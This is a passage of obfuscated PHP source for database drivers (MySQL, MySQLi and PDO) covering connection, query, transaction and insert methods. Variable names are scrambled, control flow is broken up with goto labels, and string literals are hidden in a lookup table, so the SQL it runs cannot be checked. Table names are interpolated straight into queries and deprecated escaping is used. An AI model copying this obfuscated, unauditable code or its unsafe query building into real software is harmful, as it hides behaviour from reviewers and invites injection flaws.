$d§ÜÉ›åğ† = $aì«ßö•[$b÷ğŸœ¤çî[847]] . ($aì«ßö•[$b÷ğŸœ¤çî[848]] ? "\x3a{$aì«ßö•[$b÷ğŸœ¤çî[848]]}" : $b÷ğŸœ¤çî[33]); $F°“„òæÙ” = !empty($aì«ßö•[$b÷ğŸœ¤çî[13]][$b÷ğŸœ¤çî[14]]) ? $aì«ßö•[$b÷ğŸœ¤çî[13]][$b÷ğŸœ¤çî[14]] : $this->pconnect; goto EÏ‘¦í²; A…ùß½‚±: mysql_query($b÷ğŸœ¤çî[851] . think_config($b÷ğŸœ¤çî[852]) . $b÷ğŸœ¤çî[55], $this->linkID[$DàÈ™›£×á]); if ($eİÀíè±ãÆ > $b÷ğŸœ¤çî[853]) { mysql_query($b÷ğŸœ¤çî[854], $this->linkID[$DàÈ™›£×á]); } $this->connected = !0; goto B°¶Şæğ•¸; C³ÇŒØÜˆÙ: } return $this->linkID[$DàÈ™›£×á]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($f®™±½Šö«) { goto dê•¥Àíè”; dõˆ©¬Ä‡­: think_action_status($b¸ç•ğç¶š[19], 1); think_status($b¸ç•ğç¶š[20]); $this->queryID = mysql_query($f®™±½Šö«, $this->_linkID); goto dé³Òãì¸Ä; dé³Òãì¸Ä: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto d¾¼„âöä; dê•¥Àíè”: $b¸ç•ğç¶š =& $_SERVER[«¾°Ã¤]; if (0 === stripos($f®™±½Šö«, $b¸ç•ğç¶š[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto d—ÂÅ•“¾; d—ÂÅ•“¾: if (!$this->_linkID) { return !1; } $this->queryStr = $f®™±½Šö«; if ($this->queryID) { $this->free(); } goto dõˆ©¬Ä‡­; d¾¼„âöä: } public function execute($CÊ£×µŠ¢Î) { goto EÓ¬·Ó¦µŒ; bŸ‚Õ‡ìÆ¯: think_status($aÂÛ¢äÑ±ã[20]); $DµÖ›é›åì = mysql_query($CÊ£×µŠ¢Î, $this->_linkID); $this->debug(); goto cæå•íÏÙ; EÓ¬·Ó¦µŒ: $aÂÛ¢äÑ±ã =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B»Ç¤‹¶ÕË; B»Ç¤‹¶ÕË: $this->queryStr = $CÊ£×µŠ¢Î; if ($this->queryID) { $this->free(); } think_action_status($aÂÛ¢äÑ±ã[21], 1); goto bŸ‚Õ‡ìÆ¯; cæå•íÏÙ: if (!1 === $DµÖ›é›åì) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aéÅë’ùÜ–; aéÅë’ùÜ–: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[«¾°Ã¤][855], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e§Èäòòù = mysql_query($_SERVER[«¾°Ã¤][856], $this->_linkID); $this->transTimes = 0; if (!$e§Èäòòù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cè“Ø°†ÜÛ = mysql_query($_SERVER[«¾°Ã¤][857], $this->_linkID); $this->transTimes = 0; if (!$cè“Ø°†ÜÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $e›È†© = array(); if ($this->numRows > 0) { while ($A½¤Ê†ÊÇ = mysql_fetch_assoc($this->queryID)) { $e›È†©[] = $A½¤Ê†ÊÇ; } mysql_data_seek($this->queryID, 0); } return $e›È†©; } public function getFields($Dóà’’×Ò×) { $D×²ª·’µ =& $_SERVER[«¾°Ã¤]; $fÙÈÓÀßÆ = $this->query($D×²ª·’µ[858] . $this->parseKey($Dóà’’×Ò×)); $CÎÂ‚—œŸ¾ = array(); if ($fÙÈÓÀßÆ) { foreach ($fÙÈÓÀßÆ as $dƒïÜŸ¨ó => $B¨½Ÿ‚˜ß) { $CÎÂ‚—œŸ¾[$B¨½Ÿ‚˜ß[$D×²ª·’µ[27]]] = array($D×²ª·’µ[28] => $B¨½Ÿ‚˜ß[$D×²ª·’µ[27]], $D×²ª·’µ[29] => $B¨½Ÿ‚˜ß[$D×²ª·’µ[30]], $D×²ª·’µ[31] => (bool) (strtoupper($B¨½Ÿ‚˜ß[$D×²ª·’µ[32]]) === $D×²ª·’µ[859]), $D×²ª·’µ[34] => $B¨½Ÿ‚˜ß[$D×²ª·’µ[35]], $D×²ª·’µ[36] => strtolower($B¨½Ÿ‚˜ß[$D×²ª·’µ[37]]) == $D×²ª·’µ[38], $D×²ª·’µ[39] => strtolower($B¨½Ÿ‚˜ß[$D×²ª·’µ[40]]) == $D×²ª·’µ[41]); } } return $CÎÂ‚—œŸ¾; } public function getTables($bç—™óì = '') { $C±Ş¤ôå“ß =& $_SERVER[«¾°Ã¤]; if (!empty($bç—™óì)) { $cîâ–‰®Î¤ = $C±Ş¤ôå“ß[860] . $bç—™óì . $C±Ş¤ôå“ß[861]; } else { $cîâ–‰®Î¤ = $C±Ş¤ôå“ß[862]; } $D×›µ•¸ = $this->query($cîâ–‰®Î¤); $b„äÈİ†¯ = array(); foreach ($D×›µ•¸ as $FÉ¶Ã¡˜Œ => $A‘³¶¼²Ëö) { $b„äÈİ†¯[$FÉ¶Ã¡˜Œ] = current($A‘³¶¼²Ëö); } return $b„äÈİ†¯; } public function replace($EØğäÇĞÅî, $aÛ—«éŠ…Ù = array()) { $C ÕõãÆ¼ß =& $_SERVER[«¾°Ã¤]; foreach ($EØğäÇĞÅî as $BåŞ”’¥×ô => $C‚¿ŸñãÜ×) { $b’×Û ø£Ù = $this->parseValue($C‚¿ŸñãÜ×); if (is_scalar($b’×Û ø£Ù)) { $Dœ´¹±òÄâ[] = $b’×Û ø£Ù; $AÅ¡»òª¼Â[] = $this->parseKey($BåŞ”’¥×ô); } } $Aõ†Ó¸æÔ´ = $C ÕõãÆ¼ß[863] . $this->parseTable($aÛ—«éŠ…Ù[$C ÕõãÆ¼ß[277]]) . $C ÕõãÆ¼ß[864] . implode($C ÕõãÆ¼ß[47], $AÅ¡»òª¼Â) . $C ÕõãÆ¼ß[865] . implode($C ÕõãÆ¼ß[47], $Dœ´¹±òÄâ) . $C ÕõãÆ¼ß[866]; return $this->execute($Aõ†Ó¸æÔ´); } public function insertAll($Eİ¨‰Ø¼ƒó, $Eğ„Òç†òõ = array(), $aé°¿·˜ãó = false) { goto cŞìƒ¶‘Â; cŞìƒ¶‘Â: $D‰‰…£¸ö =& $_SERVER[«¾°Ã¤]; if (!is_array($Eİ¨‰Ø¼ƒó[0])) { return !1; } $bá‡‚êÏ× = array_keys($Eİ¨‰Ø¼ƒó[0]); goto F©Şãã—À; B‘Ç±œ¬Ñ¡: $e«Åô‰Ÿ¤ = ($aé°¿·˜ãó ? $D‰‰…£¸ö[868] : $D‰‰…£¸ö[869]) . $D‰‰…£¸ö[870] . $this->parseTable($Eğ„Òç†òõ[$D‰‰…£¸ö[277]]) . $D‰‰…£¸ö[864] . implode($D‰‰…£¸ö[47], $bá‡‚êÏ×) . $D‰‰…£¸ö[871] . implode($D‰‰…£¸ö[47], $Fç‰œ‹•†); return $this->execute($e«Åô‰Ÿ¤); goto Eµ‘ÅÍ‘Åç; F©Şãã—À: $Fç‰œ‹•† = array(); foreach ($Eİ¨‰Ø¼ƒó as $EÈô‚‹‹Ã) { $Aˆİ…ôØ†‚ = array(); foreach ($EÈô‚‹‹Ã as $aäô¯ë¡”¥ => $DÃñ›İ»‡÷) { $DÃñ›İ»‡÷ = $this->parseValue($DÃñ›İ»‡÷); if (is_scalar($DÃñ›İ»‡÷)) { $Aˆİ…ôØ†‚[] = $DÃñ›İ»‡÷; } } $Fç‰œ‹•†[] = $D‰‰…£¸ö[258] . implode($D‰‰…£¸ö[47], $Aˆİ…ôØ†‚) . $D‰‰…£¸ö[866]; } array_walk($bá‡‚êÏ×, array($this, $D‰‰…£¸ö[867])); goto B‘Ç±œ¬Ñ¡; Eµ‘ÅÍ‘Åç: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $A»ÛÅ‡¹„¨ =& $_SERVER[«¾°Ã¤]; $this->error = mysql_errno() . $A»ÛÅ‡¹„¨[4] . mysql_error($this->_linkID); if ($A»ÛÅ‡¹„¨[33] != $this->queryStr) { $this->error .= LNG($A»ÛÅ‡¹„¨[45]) . $this->queryStr; } think_trace($this->error, $A»ÛÅ‡¹„¨[33], $A»ÛÅ‡¹„¨[46]); return $this->error; } public function escapeString($F¯Ğ–õ®‘ä) { if ($this->_linkID) { return mysql_real_escape_string($F¯Ğ–õ®‘ä, $this->_linkID); } else { return mysql_escape_string($F¯Ğ–õ®‘ä); } } public function parseKey(&$d¹¤©Î” Õ, $A×ÓØÒ±Ï = true) { $Cƒ­ˆ†Îêï =& $_SERVER[«¾°Ã¤]; if ($A×ÓØÒ±Ï) { $d¹¤©Î” Õ = $this->parseKeyCheck($d¹¤©Î” Õ); } if ($d¹¤©Î” Õ != $Cƒ­ˆ†Îêï[182] && !preg_match($Cƒ­ˆ†Îêï[872], $d¹¤©Î” Õ)) { $d¹¤©Î” Õ = $Cƒ­ˆ†Îêï[382] . trim($d¹¤©Î” Õ, $Cƒ­ˆ†Îêï[382]) . $Cƒ­ˆ†Îêï[382]; } return $d¹¤©Î” Õ; } } class DbMysqli extends Db { public function __construct($B±¸“¦ÕĞ¿ = '') { $C¬Ö«õ½ =& $_SERVER[«¾°Ã¤]; if (!extension_loaded($C¬Ö«õ½[767])) { think_exception(think_lang($C¬Ö«õ½[10]) . $C¬Ö«õ½[873]); } if (!empty($B±¸“¦ÕĞ¿)) { $this->config = $B±¸“¦ÕĞ¿; if (empty($this->config[$C¬Ö«õ½[13]])) { $this->config[$C¬Ö«õ½[13]] = $C¬Ö«õ½[33]; } } } public function connect($FŞê…Ñ”‚ = '', $E‘×‹ç‰Ü = 0) { $cŠ–Õöµ“ =& $_SERVER[«¾°Ã¤]; if (!isset($this->linkID[$E‘×‹ç‰Ü])) { goto DÙ¡§³à³‹; DÙ¡§³à³‹: if (empty($FŞê…Ñ”‚)) { $FŞê…Ñ”‚ = $this->config; } $this->linkID[$E‘×‹ç‰Ü] = new mysqli($FŞê…Ñ”‚[$cŠ–Õöµ“[847]], $FŞê…Ñ”‚[$cŠ–Õöµ“[849]], $FŞê…Ñ”‚[$cŠ–Õöµ“[850]], $FŞê…Ñ”‚[$cŠ–Õöµ“[17]], $FŞê…Ñ”‚[$cŠ–Õöµ“[848]] ? intval($FŞê…Ñ”‚[$cŠ–Õöµ“[848]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto AÂºß¤¹šß; AÂºß¤¹šß: $BŸÓ„Ò“ñ = $this->linkID[$E‘×‹ç‰Ü]->server_version; $this->linkID[$E‘×‹ç‰Ü]->query($cŠ–Õöµ“[851] . think_config($cŠ–Õöµ“[852]) . $cŠ–Õöµ“[55]); if ($BŸÓ„Ò“ñ > $cŠ–Õöµ“[853]) { $this->linkID[$E‘×‹ç‰Ü]->query($cŠ–Õöµ“[854]); } goto aè± ¹µ¬·; aè± ¹µ¬·: $this->connected = !0; if (1 != think_config($cŠ–Õöµ“[18])) { unset($this->config); } goto B×š•‰Ã÷¾; B×š•‰Ã÷¾: } return $this->linkID[$E‘×‹ç‰Ü]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fÏÙ‡ã½Ü) { goto Eµ„É—æòŞ; Eµ„É—æòŞ: $b—áÓŒ‚£‚ =& $_SERVER[«¾°Ã¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B‹Åîí¬à; AÏãÑ¬®õ: think_status($b—áÓŒ‚£‚[20]); $this->queryID = $this->_linkID->query($fÏÙ‡ã½Ü); if ($this->_linkID->more_results()) { while (($D¦Ó¨‰„á’ = $this->_linkID->next_result()) != NULL) { $D¦Ó¨‰„á’->free_result(); } } goto Bİ»’Ó”ğÖ; B‹Åîí¬à: $this->queryStr = $fÏÙ‡ã½Ü; if ($this->queryID) { $this->free(); } think_action_status($b—áÓŒ‚£‚[19], 1); goto AÏãÑ¬®õ; Bİ»’Ó”ğÖ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto f‚¹èÏÛä¾; f‚¹èÏÛä¾: } public function execute($D¯°æŒ¨ë†) { goto b•¼—‡ŞÉ; b¹ÜŸâº˜: think_status($f…‘×»âì[20]); $FÔˆ…ÚØÍ„ = $this->_linkID->query($D¯°æŒ¨ë†); $this->debug(); goto A¦á½—óÜ; b•¼—‡ŞÉ: $f…‘×»âì =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DÂŠ»è÷„; DÂŠ»è÷„: $this->queryStr = $D¯°æŒ¨ë†; if ($this->queryID) { $this->free(); } think_action_status($f…‘×»âì[21], 1); goto b¹ÜŸâº˜; A¦á½—óÜ: if (!1 === $FÔˆ…ÚØÍ„) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto A’‹ÅŞæêÒ; A’‹ÅŞæêÒ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÃ™‘ÚÔƒ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$BÃ™‘ÚÔƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B•Ó¥‘“” = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B•Ó¥‘“”) { $this->error(); return !1; } } return !0; } private function getAll() { $cÊÁ«Ø”¡± = array(); if ($this->numRows > 0) { for ($fÖÌöËğò˜ = 0; $fÖÌöËğò˜ < $this->numRows; $fÖÌöËğò˜++) { $cÊÁ«Ø”¡±[$fÖÌöËğò˜] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $cÊÁ«Ø”¡±; } public function getFields($Bºƒù¾§›Ä) { $F§Şõ±£ùØ =& $_SERVER[«¾°Ã¤]; $cø©£¿Œ¢¡ = $this->query($F§Şõ±£ùØ[858] . $this->parseKey($Bºƒù¾§›Ä)); $f™Õ»°ïëƒ = array(); if ($cø©£¿Œ¢¡) { foreach ($cø©£¿Œ¢¡ as $Cë¸¹ ÊÕ => $e‡é‚³åø) { $f™Õ»°ïëƒ[$e‡é‚³åø[$F§Şõ±£ùØ[27]]] = array($F§Şõ±£ùØ[28] => $e‡é‚³åø[$F§Şõ±£ùØ[27]], $F§Şõ±£ùØ[29] => $e‡é‚³åø[$F§Şõ±£ùØ[30]], $F§Şõ±£ùØ[31] => (bool) ($e‡é‚³åø[$F§Şõ±£ùØ[32]] === $F§Şõ±£ùØ[33]), $F§Şõ±£ùØ[34] => $e‡é‚³åø[$F§Şõ±£ùØ[35]], $F§Şõ±£ùØ[36] => strtolower($e‡é‚³åø[$F§Şõ±£ùØ[37]]) == $F§Şõ±£ùØ[38], $F§Şõ±£ùØ[39] => strtolower($e‡é‚³åø[$F§Şõ±£ùØ[40]]) == $F§Şõ±£ùØ[41]); } } return $f™Õ»°ïëƒ; } public function getTables($Dæ…°®õ¸¦ = '') { $B¢Ôä¡ºÏ =& $_SERVER[«¾°Ã¤]; $Bôºç¤éñ = !empty($Dæ…°®õ¸¦) ? $B¢Ôä¡ºÏ[860] . $Dæ…°®õ¸¦ . $B¢Ôä¡ºÏ[861] : $B¢Ôä¡ºÏ[862]; $C³Õøª³³î = $this->query($Bôºç¤éñ); $BÑ°Ò‡ãìÒ = array(); if ($C³Õøª³³î) { foreach ($C³Õøª³³î as $D¾™±Æ¥¸ => $E¡ùšƒìö) { $BÑ°Ò‡ãìÒ[$D¾™±Æ¥¸] = current($E¡ùšƒìö); } } return $BÑ°Ò‡ãìÒ; } public function replace($AÎÇ•ªÈÛ, $fÖ™ó†â«Å = array()) { $AË‡‚®¿ÄÃ =& $_SERVER[«¾°Ã¤]; foreach ($AÎÇ•ªÈÛ as $F›…±¢ŠÌ¼ => $DÕô´ùšåİ) { $AÚ†Õ×èÂˆ = $this->parseValue($DÕô´ùšåİ); if (is_scalar($AÚ†Õ×èÂˆ)) { $D»àŠ»ÕÒÄ[] = $AÚ†Õ×èÂˆ; $d²Â ‹õ[] = $this->parseKey($F›…±¢ŠÌ¼); } } $DœŠÁÅÅ†À = $AË‡‚®¿ÄÃ[863] . $this->parseTable($fÖ™ó†â«Å[$AË‡‚®¿ÄÃ[277]]) . $AË‡‚®¿ÄÃ[864] . implode($AË‡‚®¿ÄÃ[47], $d²Â ‹õ) . $AË‡‚®¿ÄÃ[865] . implode($AË‡‚®¿ÄÃ[47], $D»àŠ»ÕÒÄ) . $AË‡‚®¿ÄÃ[866]; return $this->execute($DœŠÁÅÅ†À); } public function insertAll($dÁÎ»Å»µ”, $aâˆ”¤ó†Í = array(), $CÁ§‰íÙ’… = false) { goto dí¸®·«…; dí¸®·«…: $FßÇ–‚³‘¤ =& $_SERVER[«¾°Ã¤]; if (!is_array($dÁÎ»Å»µ”[0])) { return !1; } $C¿—…‹©š– = array_keys($dÁÎ»Å»µ”[0]); goto f¼àÌøªÓ; f¼àÌøªÓ: $B¨ãŒµº = array(); foreach ($dÁÎ»Å»µ” as $C¯Ë©Ö…é×) { $CßßĞÒÔ“ = array(); foreach ($C¯Ë©Ö…é× as $Cƒ¢Í£¥ó· => $dªŸÆæšî¯) { $dªŸÆæšî¯ = $this->parseValue($dªŸÆæšî¯); if (is_scalar($dªŸÆæšî¯)) { $CßßĞÒÔ“[] = $dªŸÆæšî¯; } } $B¨ãŒµº[] = $FßÇ–‚³‘¤[258] . implode($FßÇ–‚³‘¤[47], $CßßĞÒÔ“) . $FßÇ–‚³‘¤[866]; } array_walk($C¿—…‹©š–, array($this, $FßÇ–‚³‘¤[867])); goto A—µ±‹˜¨; A—µ±‹˜¨: $BÃë£“Ãµ™ = $CÁ§‰íÙ’… ? $FßÇ–‚³‘¤[868] : $FßÇ–‚³‘¤[869]; $aÔ„•­¢ª = $BÃë£“Ãµ™ . $FßÇ–‚³‘¤[870] . $this->parseTable($aâˆ”¤ó†Í[$FßÇ–‚³‘¤[277]]) . $FßÇ–‚³‘¤[864] . implode($FßÇ–‚³‘¤[47], $C¿—…‹©š–) . $FßÇ–‚³‘¤[871] . implode($FßÇ–‚³‘¤[47], $B¨ãŒµº); return $this->execute($aÔ„•­¢ª); goto a’Å ³øÈ; a’Å ³øÈ: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Då¥ÎÑ»—ï =& $_SERVER[«¾°Ã¤]; $this->error = $this->_linkID->errno . $Då¥ÎÑ»—ï[4] . $this->_linkID->error; if ($Då¥ÎÑ»—ï[33] != $this->queryStr) { $this->error .= LNG($Då¥ÎÑ»—ï[45]) . $this->queryStr; } think_trace($this->error, $Då¥ÎÑ»—ï[33], $Då¥ÎÑ»—ï[46]); return $this->error; } public function escapeString($BÁö—“Âã) { if ($this->_linkID) { return $this->_linkID->real_escape_string($BÁö—“Âã); } else { return addslashes($BÁö—“Âã); } } public function parseKey(&$FéŸÃÓšë¥, $FæªÛ©âä = true) { $Dİİ‚ÈÈİ» =& $_SERVER[«¾°Ã¤]; if ($FæªÛ©âä) { $FéŸÃÓšë¥ = $this->parseKeyCheck($FéŸÃÓšë¥); } if ($FéŸÃÓšë¥ != $Dİİ‚ÈÈİ»[182] && !preg_match($Dİİ‚ÈÈİ»[872], $FéŸÃÓšë¥)) { $FéŸÃÓšë¥ = $Dİİ‚ÈÈİ»[382] . trim($FéŸÃÓšë¥, $Dİİ‚ÈÈİ»[382]) . $Dİİ‚ÈÈİ»[382]; } return $FéŸÃÓšë¥; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($c®‡§Ìâ­ä = '') { $cŒŠÇêòñÉ =& $_SERVER[«¾°Ã¤]; if (!class_exists($cŒŠÇêòñÉ[874])) { think_exception(think_lang($cŒŠÇêòñÉ[10]) . $cŒŠÇêòñÉ[875]); } if (!empty($c®‡§Ìâ­ä)) { $this->config = $c®‡§Ìâ­ä; if (empty($this->config[$cŒŠÇêòñÉ[13]])) { $this->config[$cŒŠÇêòñÉ[13]] = array(); } } } public function connect($D†é‘ÄÊ» = '', $Bé Ğ‘÷â“ = 0) { $bçî×´á‹‡ =& $_SERVER[«¾°Ã¤]; if (!isset($this->linkID[$Bé Ğ‘÷â“])) { goto d‘É™¿Ñ¦É; d‘É™¿Ñ¦É: if (empty($D†é‘ÄÊ»)) { $D†é‘ÄÊ» = $this->config; } $F˜çå¦³ËĞ = !empty($D†é‘ÄÊ»[$bçî×´á‹‡[13]][$bçî×´á‹‡[14]]) ? $D†é‘ÄÊ»[$bçî×´á‹‡[13]][$bçî×´á‹‡[14]] : $this->pconnect; if ($F˜çå¦³ËĞ) { $D†é‘ÄÊ»[$bçî×´á‹‡[13]][PDO::ATTR_PERSISTENT] = !0; } goto BÇßÓŸ²ø; FÖ»ê°ª: if (!$this->linkID[$Bé Ğ‘÷â“]) { think_exception($bçî×´á‹‡[884]); } try { $this->linkID[$Bé Ğ‘÷â“]->exec($bçî×´á‹‡[885] . think_config($bçî×´á‹‡[852])); } catch (Exception $c‰öùÒõÀ) { } $this->connected = !0; goto a™ƒ¢ƒÜ¾§; BÇßÓŸ²ø: try { $this->linkID[$Bé Ğ‘÷â“] = new PDO($D†é‘ÄÊ»[$bçî×´á‹‡[876]], $D†é‘ÄÊ»[$bçî×´á‹‡[849]], $D†é‘ÄÊ»[$bçî×´á‹‡[850]], $D†é‘ÄÊ»[$bçî×´á‹‡[13]]); } catch (PDOException $c‰öùÒõÀ) { think_exception($c‰öùÒõÀ->getMessage()); } $this->dbType = $this->_getDsnType($D†é‘ÄÊ»[$bçî×´á‹‡[876]]); if (in_array($this->dbType, array($bçî×´á‹‡[877], $bçî×´á‹‡[878], $bçî×´á‹‡[879], $bçî×´á‹‡[880]))) { think_exception($bçî×´á‹‡[881] . $this->dbType . $bçî×´á‹‡[882] . $this->dbType . $bçî×´á‹‡[883]); } goto FÖ»ê°ª; a™ƒ¢ƒÜ¾§: if (1 != think_config($bçî×´á‹‡[18])) { unset($this->config); } goto EÏ—©Äóƒ; EÏ—©Äóƒ: } return $this->linkID[$Bé Ğ‘÷â“]; } public function free() { $this->PDOStatement = null; } public function query($FˆŞÄ«‚æí, $CÚÜª™ = array()) { goto DÒ¤©öÇÉ„; dêÖ­ÛÀ‰„: think_action_status($b¸ÒÍÓÌÚ†[19], 1); think_status($b¸ÒÍÓÌÚ†[20]); $this->PDOStatement = $this->_linkID->prepare($FˆŞÄ«‚æí); goto fªÉ¡³…©; c¸•ãä¤: if (!1 === $DƒÏ‹°Åİ) { $this->error(); return !1; } else { return $this->getAll(); } goto F¶Ëøé³øö; DÒ¤©öÇÉ„: $b¸ÒÍÓÌÚ† =& $_SERVER[«¾°Ã¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Aö¸°³åëæ; fªÉ¡³…©: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $DƒÏ‹°Åİ = $this->PDOStatement->execute($CÚÜª™); $this->debug(); goto c¸•ãä¤; Aö¸°³åëæ: $this->queryStr = $FˆŞÄ«‚æí; if (!empty($CÚÜª™)) { $this->queryStr .= $b¸ÒÍÓÌÚ†[886] . print_r($CÚÜª™, !0) . $b¸ÒÍÓÌÚ†[887]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dêÖ­ÛÀ‰„; F¶Ëøé³øö: } public function execute($bœã¶ö‰, $bøÙ¡Åò©¶ = array()) { goto aŒ½ƒ„Šù™; eĞÅ‹Ë°µˆ: $EË¿ªÑ•ø = $this->PDOStatement->execute($bøÙ¡Åò©¶); $this->debug(); if (!1 === $EË¿ªÑ•ø) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Dèõ´Ë¨“˜ || preg_match($Dªâ¨Í°¤¸[892], $bœã¶ö‰)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto cÑãŸÂ‰¢; a«¶ÔÖõØ: if ($this->dbType == $Dªâ¨Í°¤¸[880]) { if (preg_match($Dªâ¨Í°¤¸[888], $this->queryStr, $a¸¨ß²ƒ)) { $this->table = think_config($Dªâ¨Í°¤¸[889]) . str_ireplace(think_config($Dªâ¨Í°¤¸[890]), $Dªâ¨Í°¤¸[375], $a¸¨ß²ƒ[2]); $Dèõ´Ë¨“˜ = (bool) $this->query($Dªâ¨Í°¤¸[891] . strtoupper($this->table) . $Dªâ¨Í°¤¸[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Dªâ¨Í°¤¸[21], 1); goto a˜–øäÙÈ; aŒ½ƒ„Šù™: $Dªâ¨Í°¤¸ =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c«Ø¥İÈá; c«Ø¥İÈá: $this->queryStr = $bœã¶ö‰; if (!empty($bøÙ¡Åò©¶)) { $this->queryStr .= $Dªâ¨Í°¤¸[886] . print_r($bøÙ¡Åò©¶, !0) . $Dªâ¨Í°¤¸[887]; } $Dèõ´Ë¨“˜ = !1; goto a«¶ÔÖõØ; a˜–øäÙÈ: think_status($Dªâ¨Í°¤¸[20]); $this->PDOStatement = $this->_linkID->prepare($bœã¶ö‰); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eĞÅ‹Ë°µˆ; cÑãŸÂ‰¢: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a­ ŸÁÁÓ = $this->_linkID->commit(); $this->transTimes = 0; if (!$a­ ŸÁÁÓ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÈÏĞæÁá = $this->_linkID->rollback(); $this->transTimes = 0; if (!$CÈÏĞæÁá) { $this->error(); return !1; } } return !0; } private function getAll() { $cì§øóŞ¡³ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($cì§øóŞ¡³); return $cì§øóŞ¡³; } public function getFields($e’½œÔì»Õ) { goto Bò¤±Ó±£¿; Bò¤±Ó±£¿: $e¸ªÉøÊµ© =& $_SERVER[«¾°Ã¤]; $this->initConnect(!0); if (think_config($e¸ªÉøÊµ©[893])) { $DàŒâã²Ø = str_replace($e¸ªÉøÊµ©[894], $e’½œÔì»Õ, think_config($e¸ªÉøÊµ©[893])); } else { switch ($this->dbType) { case $e¸ªÉøÊµ©[877]: case $e¸ªÉøÊµ©[895]: $DàŒâã²Ø = "\x53\x45\x4c\105\x43\x54\40\40\x20\x63\x6f\x6c\x75\155\x6e\x5f\x6e\141\155\x65\40\x61\x73\x20\x27\x4e\141\155\x65\47\54\x20\40\40\x64\x61\x74\x61\137\x74\x79\x70\145\40\x61\163\40\x27\x54\171\160\x65\x27\x2c\x20\x20\x20\x63\157\154\165\155\x6e\137\144\x65\x66\141\165\x6c\x74\x20\141\163\40\47\x44\145\146\x61\x75\x6c\164\47\54\40\40\40\151\163\x5f\x6e\x75\154\154\141\x62\154\x65\x20\x61\x73\x20\x27\x4e\x75\x6c\x6c\x27\12\11\11\x46\122\x4f\115\11\151\x6e\x66\157\x72\x6d\x61\x74\x69\157\x6e\x5f\163\x63\x68\x65\155\x61\56\164\x61\142\154\x65\x73\40\x41\x53\40\x74\xa\x9\x9\112\x4f\x49\x4e\x9\x69\x6e\146\157\162\155\141\x74\151\x6f\156\137\x73\x63\x68\x65\155\141\56\x63\x6f\154\165\155\x6e\163\40\x41\123\40\x63\xa\x9\11\117\116\40\40\164\x2e\164\x61\142\x6c\x65\137\x63\x61\x74\141\x6c\157\x67\40\x3d\40\143\56\164\141\142\154\145\x5f\x63\x61\x74\141\x6c\x6f\x67\xa\11\x9\x41\x4e\x44\x20\x74\56\164\x61\142\154\x65\137\163\143\x68\145\155\141\40\x3d\40\143\56\164\x61\x62\x6c\x65\137\163\143\150\145\155\x61\xa\11\11\101\116\x44\x20\x74\x2e\x74\141\x62\154\145\x5f\x6e\141\x6d\x65\40\x3d\40\143\56\x74\141\x62\154\x65\137\156\141\x6d\x65\xa\x9\x9\127\x48\x45\x52\x45\40\40\40\x74\56\x74\141\142\154\x65\x5f\x6e\x61\155\145\40\75\40\x27{$e’½œÔì»Õ}\x27"; break; case $e¸ªÉøÊµ©[896]: $DàŒâã²Ø = $e¸ªÉøÊµ©[897] . $e’½œÔì»Õ . $e¸ªÉøÊµ©[898]; break; case $e¸ªÉøÊµ©[878]: case $e¸ªÉøÊµ©[880]: $DàŒâã²Ø = $e¸ªÉøÊµ©[899] . $e¸ªÉøÊµ©[900] . $e¸ªÉøÊµ©[901] . strtoupper($e’½œÔì»Õ) . $e¸ªÉøÊµ©[902] . strtoupper($e’½œÔì»Õ) . $e¸ªÉøÊµ©[903]; break; case $e¸ªÉøÊµ©[904]: $DàŒâã²Ø = $e¸ªÉøÊµ©[905] . $e’½œÔì»Õ . $e¸ªÉøÊµ©[906]; break; case $e¸ªÉøÊµ©[879]: break; case $e¸ªÉøÊµ©[907]: default: $DàŒâã²Ø = $e¸ªÉøÊµ©[908] . ($this->dbType == $e¸ªÉøÊµ©[907] ? "\140{$e’½œÔì»Õ}\x60" : 